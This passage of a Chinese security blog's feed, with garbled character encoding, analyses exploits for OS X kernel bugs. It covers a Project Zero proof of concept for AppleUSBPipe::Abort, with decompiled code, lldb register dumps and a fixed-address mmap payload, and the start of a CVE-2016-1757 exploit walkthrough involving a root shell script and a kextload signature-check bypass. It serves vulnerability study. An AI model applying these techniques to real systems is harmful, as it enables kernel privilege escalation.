class="comment">// 0xffffff800a444ab8: f0 f0 f0 f0 00 00 00 00 00 00 00 00 00 00 00 00  ????............</span></span><br><span class="line">                                                <span class="comment">// 0xffffff800a444ac8: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span></span><br><span class="line">                                                <span class="comment">// </span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªå‡½æ•°çš„é€»è¾‘éå¸¸ç®€å•ï¼Œå°±æ˜¯æ ¹æ®æ”¶åˆ°çš„å‚æ•°å¤„ç†åè°ƒç”¨äº†<code>IOUSBInterfaceUserClient::AbortStreamsPipe</code>å‡½æ•°ï¼Œæ¯ä¸€ä¸ªå‚æ•°å·²ç»åœ¨æ³¨é‡Šä¸­ä½“ç°äº†ã€‚</p>
<h2 id="3-2IOUSBInterfaceUserClient::AbortStreamsPipe">3.2IOUSBInterfaceUserClient::AbortStreamsPipe</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall IOUSBInterfaceUserClient::AbortStreamsPipe(IOUSBInterfaceUserClient *<span class="keyword">this</span>, <span class="keyword">unsigned</span> __int8 a2, <span class="keyword">unsigned</span> <span class="keyword">int</span> a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> steamID; <span class="comment">// er15@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 _a2; <span class="comment">// r12@1</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// er15@2</span></span><br><span class="line">  __int64 v6; <span class="comment">// r12@2</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// er13@2</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax@2</span></span><br><span class="line">  __int64 v9; <span class="comment">// r14@2</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax@2</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> ret; <span class="comment">// er14@6</span></span><br><span class="line">  OSMetaClassBase *_p_pipe_obj; <span class="comment">// rax@8</span></span><br><span class="line">  <span class="keyword">const</span> OSMetaClass *v13; <span class="comment">// rdx@8</span></span><br><span class="line">  OSMetaClassBase *__p_pipe_obj; <span class="comment">// rbx@8</span></span><br><span class="line">  _QWORD *_p_usb_pipe; <span class="comment">// rax@9</span></span><br><span class="line">  <span class="keyword">int</span> _ret; <span class="comment">// eax@10</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v18; <span class="comment">// [sp+18h] [bp-38h]@2</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [sp+1Ch] [bp-34h]@2</span></span><br><span class="line">  __int64 v20; <span class="comment">// [sp+20h] [bp-30h]@2</span></span><br><span class="line"></span><br><span class="line">  steamID = a3;                                 <span class="comment">// 0xf0f0f0f0</span></span><br><span class="line">  _a2 = a2;                                     <span class="comment">// 0x00000000</span></span><br><span class="line">  <span class="keyword">if</span> ( *((_BYTE *)<span class="keyword">this</span> + <span class="number">0x1B4</span>) &amp; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = a3;</span><br><span class="line">    clock_get_system_microtime(&amp;v20, &amp;v19);</span><br><span class="line">    v5 = *((_DWORD *)<span class="keyword">this</span> + <span class="number">0x6D</span>);</span><br><span class="line">    v6 = v20;</span><br><span class="line">    v7 = v19;</span><br><span class="line">    LODWORD(v8) = (*(<span class="keyword">int</span> (__fastcall **)(IOUSBInterfaceUserClient *, _QWORD))(*(_QWORD *)<span class="keyword">this</span> + <span class="number">0x388</span>LL))(<span class="keyword">this</span>, <span class="number">0L</span>L);</span><br><span class="line">    v9 = v8;</span><br><span class="line">    LODWORD(v10) = (*(<span class="keyword">int</span> (__fastcall **)(IOUSBInterfaceUserClient *, _QWORD))(*(_QWORD *)<span class="keyword">this</span> + <span class="number">0x3B8</span>LL))(<span class="keyword">this</span>, <span class="number">0L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( v5 &amp; <span class="number">0x10000</span> )</span><br><span class="line">      kprintf(&amp;<span class="string">"%06lu.%06u %s@%s: %s::%s: \n"</span>, v6, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v7, v9, v10, <span class="string">"IOUSBInterfaceUserClient"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      IOLog(&amp;<span class="string">"%06lu.%06u %s@%s: %s::%s: \n"</span>, v6, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v7, v9, v10, <span class="string">"IOUSBInterfaceUserClient"</span>);</span><br><span class="line">    steamID = v18;</span><br><span class="line">    _a2 = a2;</span><br><span class="line">  &#125;</span><br><span class="line">  ret = <span class="number">0xE00002D9</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *((_QWORD *)<span class="keyword">this</span> + <span class="number">0x37</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> __int8)IOService::isInactive(<span class="keyword">this</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(_p_pipe_obj) = (*(<span class="keyword">int</span> (__fastcall **)(IOUSBInterfaceUserClient *, _QWORD))(*(_QWORD *)<span class="keyword">this</span> + <span class="number">0xA68</span>LL))(</span><br><span class="line">                               <span class="keyword">this</span>,</span><br><span class="line">                               _a2);            <span class="comment">// IOUSBInterfaceUserClient::GetPipeObj</span></span><br><span class="line">      __p_pipe_obj = _p_pipe_obj;</span><br><span class="line">      ret = <span class="number">0xE0004061</span>;</span><br><span class="line">      <span class="keyword">if</span> ( _p_pipe_obj )</span><br><span class="line">      &#123;</span><br><span class="line">        _p_usb_pipe = (_QWORD *)OSMetaClassBase::safeMetaCast(</span><br><span class="line">                                  _p_pipe_obj,</span><br><span class="line">                                  (<span class="keyword">const</span> OSMetaClassBase *)IOUSBPipeV2::metaClass,</span><br><span class="line">                                  v13);</span><br><span class="line">        <span class="keyword">if</span> ( _p_usb_pipe )</span><br><span class="line">          _ret = (*(<span class="keyword">int</span> (__fastcall **)(_QWORD *, _QWORD))(*_p_usb_pipe + <span class="number">0x278</span>LL))(_p_usb_pipe, steamID);<span class="comment">// AppleUSBPipe::Abort(UInt32 streamID)</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          _ret = (*(<span class="keyword">int</span> (__fastcall **)(OSMetaClassBase *, _QWORD))(*(_QWORD *)__p_pipe_obj + <span class="number">0x128</span>LL))(</span><br><span class="line">                   __p_pipe_obj,</span><br><span class="line">                   IOUSBPipeV2::metaClass);</span><br><span class="line">        ret = _ret;</span><br><span class="line">        (*(<span class="keyword">void</span> (__fastcall **)(OSMetaClassBase *))(*(_QWORD *)__p_pipe_obj + <span class="number">0x28</span>LL))(__p_pipe_obj);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è°ƒç”¨<code>AppleUSBPipe::Abort</code></p>
<h2 id="3-3_AppleUSBPipe::Abort">3.3 AppleUSBPipe::Abort</h2><p>è¿™ä¸ªå‡½æ•°çœ‹æ±‡ç¼–ä»£ç æ›´å®¹æ˜“ç†è§£ä¸€äº›<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="number">0</span>x000000000002c569         mov        eax, r14d</span><br><span class="line"><span class="number">0</span>x000000000002c56c         mov        rcx, qword [ds:rbx+<span class="number">0</span>x88]</span><br><span class="line"><span class="number">0</span>x000000000002c573         mov        rdi, qword [ds:rcx+rax*<span class="number">8</span>]</span><br><span class="line"><span class="number">0</span>x000000000002c577         mov        eax, <span class="number">0</span>xe00002f0</span><br><span class="line"><span class="number">0</span>x000000000002c57c         <span class="built_in">test</span>       rdi, rdi</span><br><span class="line"><span class="number">0</span>x000000000002c57f         je         <span class="number">0</span>x2c5c9</span><br><span class="line"></span><br><span class="line">-&gt;<span class="number">0</span>x000000000002c581         mov        rax, qword [ds:rdi]</span><br><span class="line"><span class="number">0</span>x000000000002c584         xor        esi, esi</span><br><span class="line"><span class="number">0</span>x000000000002c586         mov        edx, <span class="number">0</span>xe00002eb</span><br><span class="line"><span class="number">0</span>x000000000002c58b         xor        ecx, ecx</span><br><span class="line"><span class="number">0</span>x000000000002c58d         call       qword [ds:rax+<span class="number">0</span>x178]</span><br><span class="line"><span class="number">0</span>x000000000002c593         cmp        eax, <span class="number">0</span>xe00002d6</span><br><span class="line"><span class="number">0</span>x000000000002c598         je         <span class="number">0</span>x2c5b6</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>å„ä¸ªå¯„å­˜å™¨çš„å€¼å¦‚ä¸‹ï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(lldb) register <span class="built_in">read</span></span><br><span class="line">General Purpose Registers:</span><br><span class="line">       rax = <span class="number">0</span>x00000000e00002f0</span><br><span class="line">       rbx = <span class="number">0</span>xffffff801c1a6100</span><br><span class="line">       rcx = <span class="number">0</span>x0000000000000000</span><br><span class="line">       rdx = <span class="number">0</span>xffffff801779f6e0</span><br><span class="line">       rdi = <span class="number">0</span>x4141414141414141</span><br><span class="line">       rsi = <span class="number">0</span>x00000000f0f0f0f0</span><br><span class="line">       rbp = <span class="number">0</span>xffffff887b613b20</span><br><span class="line">       rsp = <span class="number">0</span>xffffff887b613ae0</span><br><span class="line">        r8 = <span class="number">0</span>x0000000000000000</span><br><span class="line">        r9 = <span class="number">0</span>x0000000000000000</span><br><span class="line">       r10 = <span class="number">0</span>xffffff7f91b408a1  <span class="string">""</span></span><br><span class="line">       r11 = <span class="number">0</span>x0000000000000000</span><br><span class="line">       r12 = <span class="number">0</span>x0000000000000000</span><br><span class="line">       r13 = <span class="number">0</span>x0000000000000000</span><br><span class="line">       r14 = <span class="number">0</span>x00000000f0f0f0f0</span><br><span class="line">       r15 = <span class="number">0</span>x00000000f0f0f0f0</span><br><span class="line">       rip = <span class="number">0</span>xffffff7f91b11581  IOUSBFamily`AppleUSBPipe::Abort(unsigned int) + <span class="number">153</span> at AppleUSBPipe.cpp:<span class="number">1181</span></span><br><span class="line">    rflags = <span class="number">0</span>x0000000000010206</span><br><span class="line">        cs = <span class="number">0</span>x0000000000000008</span><br><span class="line">        fs = <span class="number">0</span>x0000000000000000</span><br><span class="line">        gs = <span class="number">0</span>x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p>å½“æ‰§è¡Œåˆ°è¿™é‡Œæ—¶ï¼Œå› ä¸ºraxæ˜¯åº”ç”¨å±‚ä¼ å…¥çš„å‚æ•°<code>0xf0f0f0f0</code>,è€Œrcxçš„å€¼æ˜¯<code>0x0000000000000000</code>,æ‰€ä»¥æ ¹æ®raxçš„ä¸åŒï¼Œrdiçš„å€¼ä¼šæ˜¯ä¸€ä¸ªä»<code>0x0000000000000000</code>åœ°å€å¼€å§‹åç§»é‡æ˜¯IOUSBInterfaceUserClient::AbortStreamsPipeå‡½æ•°ä¸­çš„SteamIDï¼Œä¹Ÿå°±æ˜¯POCä¸­çš„<code>0xf0f0f0f0</code>ä¹˜ä»¥<code>8LL</code>ä¹‹åè·å¾—çš„æ‰€å¾—åœ°å€æ‰€æŒ‡å‘çš„å†…å­˜å¤„çš„å€¼ã€‚</p>
<p>å› ä¸º<code>0xf0f0f0f0</code>æ˜¯ä¸€ä¸ªPOCä¸­å¯æ§å€¼ï¼Œæ‰€ä»¥<code>0x000000000002c573         mov        rdi, qword [ds:rcx+rax*8]</code>æ˜¯ä¸€ä¸ªä»0x0000000000000000åœ°å€å¼€å§‹ä»»æ„åç§»é‡çš„ä»»æ„è¯»å–ã€‚<br>å› ä¸º0xf0f0f0f0*0x8=0x787878780,ç»“åˆPOCä¸­ä»£ç <br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">map_payload</span><span class="params">(uint64_t target_rip)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span>*** obj_ptr_ptr = (<span class="keyword">void</span>*)<span class="number">0x0000000787878780</span>;</span><br><span class="line">  <span class="keyword">void</span>* request           = (<span class="keyword">void</span>*)<span class="number">0x0000000787878000</span>;</span><br><span class="line">  <span class="keyword">void</span>* page = mmap(request, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANON|MAP_PRIVATE, -<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (request != page) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"MAP_FIXED didn't give us the right page\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>((<span class="keyword">void</span>*)page, <span class="string">'A'</span>, <span class="number">0x1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>ä»åœ°å€0x0000000787878000å¼€å§‹ä¸€ç›´åˆ°0x0000000787878000+0x1000å¤„æ‰€æœ‰çš„å€¼éƒ½ä¸º0x41ã€‚<br>æ‰€ä»¥rdiå¯„å­˜å™¨çš„å€¼ä¸º0x4141414141414141ï¼Œä»è€Œå¯¼è‡´äº†POCæ‰§è¡Œæ—¶å‡ºç°å´©æºƒã€‚</p>
<p>è‡³æ­¤POCåˆ†æå®Œæ¯•ã€‚</p>
<h1 id="3-4_å°ç»“">3.4 å°ç»“</h1><p>è°ƒè¯•pocèŠ±äº†ä¸€äº›æ—¶é—´ï¼Œé™·å…¥äº†å„ç§ä»£ç å®ç°çš„åˆ†æï¼Œå’Œåšå¼€å‘æ—¶ä¸€æ ·ï¼Œè°ƒbugæ—¶éœ€è¦æ³¨é‡å´©æºƒçš„ç°åœºï¼Œåˆ†æçš„è¿‡ç¨‹ä¸­ç»å¸¸åŸ‹å¤´åˆ†æäº†ä¸€å¤§é€šä¹‹åå‘ç°å¾—åˆ°çš„ä¿¡æ¯åœ¨å´©æºƒç°åœºå·²ç»æœ‰äº†ï¼Œç”šè‡³è¿˜æœ‰ä¸€äº›åˆ†æè¿‡ç¨‹ä¸­æƒ³ä¸é€šçš„é—®é¢˜ï¼Œåœ¨å´©æºƒçš„ç°åœºä¹Ÿå·²ç»æœ‰çº¿ç´¢äº†ã€‚</p>
<h1 id="reference">reference</h1><p>1.<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=728&amp;can=1&amp;q=apple&amp;sort=-id" target="_blank" rel="external">OS X Kernel code execution due to lack of bounds checking in AppleUSBPipe::Abort</a></p>
<h1 id="PS">PS</h1><p>è¿™æ˜¯æˆ‘çš„å­¦ä¹ åˆ†äº«åšå®¢<a href="http://turingh.github.io/">http://turingh.github.io/</a></p>
<p>æ¬¢è¿å¤§å®¶æ¥æ¢è®¨ï¼Œä¸è¶³ä¹‹å¤„è¿˜è¯·æŒ‡æ­£ã€‚</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_æ‘˜è¦">0x00 æ‘˜è¦</h1><p><code>OS X</code>ç³»ç»Ÿçš„10.11.4çš„ç³»ç»Ÿè¡¥ä¸ä¸­ä¿®å¤äº†ä¸€ä¸ªåœ¨å†…æ ¸ä¸­å¯ä»¥å¯¼è‡´ä»£ç æ‰§è¡Œçš„æ¼æ´ï¼Œæ¼æ´å½¢æˆçš„åŸå› æ˜¯ç¼ºå°‘äº†å¿…è¦çš„è¾¹ç•Œå€¼æ£€æµ‹ã€‚</p>
<ul>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=728&amp;can=1&amp;q=apple&amp;sort=-id">æœ€åˆçš„æ¼æ´æŠ¥å‘Š</a></li>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=227076">POCä¸‹è½½</a><br>æœ¬æ–‡è®°å½•äº†å¯¹POCçš„ç®€å•çš„è°ƒè¯•å’Œåˆ†æï¼Œå¯¹è¯¥æ¼æ´æœ‰ä¸€ä¸ªåˆæ­¥çš„è®¤è¯†ï¼Œä¸ºåç»­çš„ç ”ç©¶åšå¥½å‡†å¤‡å·¥ä½œã€‚</li>
</ul>]]>
    
    </summary>
    
      <category term="CVE" scheme="http://turingh.github.io/tags/CVE/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/tags/OS-X/"/>
    
      <category term="bounds checking" scheme="http://turingh.github.io/tags/bounds-checking/"/>
    
      <category term="kernel" scheme="http://turingh.github.io/tags/kernel/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
      <category term="CVE" scheme="http://turingh.github.io/categories/OS-X/CVE/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2016-1757åˆ©ç”¨ç¨‹åºåˆ†æ]]></title>
    <link href="http://turingh.github.io/2016/04/19/CVE-2016-1757%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    <id>http://turingh.github.io/2016/04/19/CVE-2016-1757åˆ©ç”¨ç¨‹åºåˆ†æ/</id>
    <published>2016-04-19T18:49:14.000Z</published>
    <updated>2016-04-29T20:37:06.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0X00_æ‘˜è¦">0X00  æ‘˜è¦</h1><p>é€šè¿‡å¯¹<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757</a>çš„<code>POC</code>è¿›è¡Œåˆ†æï¼Œå·²ç»å®Œå…¨äº†è§£äº†è¿™ä¸ªè¿™ä¸ªæ¼æ´çš„æˆå› ï¼Œè¿™é‡Œå¸¦æ¥å…¶ä¸€ä¸ª<code>Exploit</code>çš„åˆ†æã€‚</p>
<p>ç›¸å…³çš„<code>poc</code>å¯ä»¥åˆ°æˆ‘çš„<code>github</code>ä¸Šé¢è·å–</p>
<p><a href="https://github.com/turingH/exploit" target="_blank" rel="external">https://github.com/turingH/exploit</a></p>
<p>æˆ–è€…ç›´æ¥åœ¨<code>google</code>çš„<code>project zero</code>ä¸­ä¸‹è½½ã€‚</p>
<p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=676&amp;can=1&amp;q=OS%20X&amp;sort=-id" target="_blank" rel="external">https://bugs.chromium.org/p/project-zero/issues/detail?id=676&amp;can=1&amp;q=OS%20X&amp;sort=-id</a></p>
<a id="more"></a>
<h1 id="0x01_Exploitæ¦‚è§ˆ">0x01 Exploitæ¦‚è§ˆ</h1><h2 id="1-1_Exploitä½¿ç”¨åˆ°äº†å“ªäº›æŠ€æœ¯">1.1 Exploitä½¿ç”¨åˆ°äº†å“ªäº›æŠ€æœ¯</h2><ol>
<li><a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757</a>æ¼æ´çš„åŸç†ã€‚</li>
<li><a href="http://turingh.github.io/2016/04/13/%E5%88%A9%E7%94%A8patch%E7%BB%95%E8%BF%87kextload%E5%AF%B9%E5%86%85%E6%A0%B8%E7%AD%BE%E5%90%8D%E7%9A%84%E6%A3%80%E6%B5%8B/">åˆ©ç”¨patchç»•è¿‡kextloadå¯¹å†…æ ¸ç­¾åçš„æ£€æµ‹</a>ã€‚</li>
</ol>
<h2 id="1-2_Exploitç›®å½•ç»“æ„">1.2 Exploitç›®å½•ç»“æ„</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">âœ  executer ls -al</span><br><span class="line">total <span class="number">184</span></span><br><span class="line">drwxr-xr-x@ <span class="number">16</span> turing  staff    <span class="number">544</span>  <span class="number">4</span> <span class="number">19</span> <span class="number">11</span>:<span class="number">30</span> .</span><br><span class="line">drwxr-xr-x@ <span class="number">33</span> turing  staff   <span class="number">1122</span>  <span class="number">4</span> <span class="number">19</span> <span class="number">10</span>:<span class="number">29</span> ..</span><br><span class="line">-rw-r--r--@  <span class="number">1</span> turing  staff   <span class="number">6148</span>  <span class="number">3</span> <span class="number">30</span> <span class="number">16</span>:<span class="number">45</span> .DS_Store</span><br><span class="line">-rw-r--r--   <span class="number">1</span> turing  staff  <span class="number">16384</span>  <span class="number">4</span> <span class="number">19</span> <span class="number">11</span>:<span class="number">30</span> .executer.c.swp</span><br><span class="line">drwxr-xr-x@  <span class="number">3</span> root    wheel    <span class="number">102</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> FakeKext.kext</span><br><span class="line">-rw-r--r--@  <span class="number">1</span> turing  staff    <span class="number">397</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> Makefile</span><br><span class="line">-rw-r--r--@  <span class="number">1</span> turing  staff      <span class="number">0</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> __init__.py</span><br><span class="line">-rw-r--r--@  <span class="number">1</span> turing  staff   <span class="number">2061</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> build_<span class="built_in">exec</span>_patch.py</span><br><span class="line">-rw-r--r--@  <span class="number">1</span> turing  staff   <span class="number">1669</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> differ.py</span><br><span class="line">-rw-r--r--   <span class="number">1</span> turing  staff   <span class="number">2085</span>  <span class="number">4</span> <span class="number">12</span> <span class="number">14</span>:<span class="number">53</span> differ.pyc</span><br><span class="line">-rwxr-xr-x   <span class="number">1</span> turing  staff  <span class="number">15308</span>  <span class="number">4</span> <span class="number">13</span> <span class="number">11</span>:<span class="number">00</span> executer</span><br><span class="line">-rw-r--r--   <span class="number">1</span> turing  staff  <span class="number">17534</span>  <span class="number">4</span> <span class="number">19</span> <span class="number">11</span>:<span class="number">02</span> executer.c</span><br><span class="line">-rw-r--r--@  <span class="number">1</span> turing  staff     <span class="number">37</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> kextload_<span class="built_in">disable</span>_signature_checks.binpatch</span><br><span class="line">-rwxr-xr-x   <span class="number">1</span> turing  staff   <span class="number">1849</span>  <span class="number">4</span> <span class="number">13</span> <span class="number">10</span>:<span class="number">45</span> load_kext.sh</span><br><span class="line">-rwxr-xr-x@  <span class="number">1</span> turing  staff    <span class="number">591</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> root_shell.sh</span><br><span class="line">-rwxr-xr-x@  <span class="number">1</span> turing  staff   <span class="number">1106</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> unload_kext.sh</span><br><span class="line">âœ  executer</span><br></pre></td></tr></table></figure>
<p>ä¸»è¦ç”±5ä¸ªéƒ¨åˆ†ç»„æˆ</p>
<ul>
<li>FakeKext.kextï¼šæœ€ç»ˆåŠ è½½çš„æµ‹è¯•å†…æ ¸æ‰©å±•ã€‚</li>
<li>*.py: ç”¨æ¥ç”Ÿæˆå¯¹<code>traceroute6</code>çš„<code>binpatch</code>æ–‡ä»¶ã€‚</li>
<li>executerï¼šé€šè¿‡<code>binpatch</code>æ–‡ä»¶ï¼Œå¯¹éœ€è¦æ‰§è¡Œçš„ç›®æ ‡ç¨‹åºè¿›è¡Œ<code>patch</code>ã€‚</li>
<li>kextload_disable_signature_checks.binpatchï¼šå­˜å‚¨äº†<code>kextload</code>éœ€è¦<code>patch</code>çš„åœ°å€ä¸å†…å®¹ã€‚</li>
<li>*.sh:é©±åŠ¨æ•´ä¸ªæµç¨‹çš„è„šæœ¬ã€‚</li>
</ul>
<h1 id="0x02_Exploitè¯¦ç»†åˆ†æ">0x02 Exploitè¯¦ç»†åˆ†æ</h1><p>å¦‚æœç›´æ¥æ‰“å¼€<code>load_kext.sh</code>æœ‰<strong>å¯èƒ½</strong>ä¸€çœ¼çœ‹ä¸å‡ºåˆ°åº•æµç¨‹æ˜¯ä»€ä¹ˆæ ·å­çš„ï¼Œæ‰€ä»¥çš„å…ˆå¯¹å‡ ä¸ªé‡è¦çš„ç»„ä»¶åšä¸€ä¸‹è¯¦ç»†çš„åˆ†æã€‚</p>
<h2 id="2-1_executerä¸binpatch">2.1 executerä¸binpatch</h2><p><code>executer</code>æ˜¯æ•´ä¸ª<code>exploit</code>ä¸­æœ€æ ¸å¿ƒçš„éƒ¨åˆ†ï¼Œæ ¸å¿ƒåŠŸèƒ½æœ‰ä¸¤ä¸ªã€‚</p>
<ul>
<li>é€šè¿‡<code>apply_patch</code>å‡½æ•°è·å–ç›®æ ‡è¿›ç¨‹éœ€è¦<code>patch</code>çš„å†…å®¹å¹¶ä¿å­˜åœ¨å†…å­˜ä¸­ã€‚</li>
<li>é€šè¿‡<code>fork</code>å­è¿›ç¨‹åœ¨æ‰§è¡Œç›®æ ‡ç¨‹åºæ—¶å­˜åœ¨çš„æ—¶é—´çª—å£é€šè¿‡<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/#1-3_Ports">PORT</a>å¯¹ç›®æ ‡è¿›ç¨‹è¿›è¡Œå†…å­˜çš„æ”¹å†™ã€‚</li>
</ul>
<p>é€šè¿‡æ—¶é—´çª—å£æ”¹å†™ç›®æ ‡è¿›ç¨‹çš„å†…å­˜å’Œ<code>POC</code>ä¸­çš„å®ç°å¤§åŒå°å¼‚ï¼Œå¯ä»¥å‚è€ƒä¹‹å‰åˆ†æ<code>POC</code>çš„<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">æ–‡ç« </a>ã€‚</p>
<p>è¿™é‡Œç®€å•çš„åˆ†æä¸€ä¸ª<code>apply_patch</code>å‡½æ•°ä¸</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 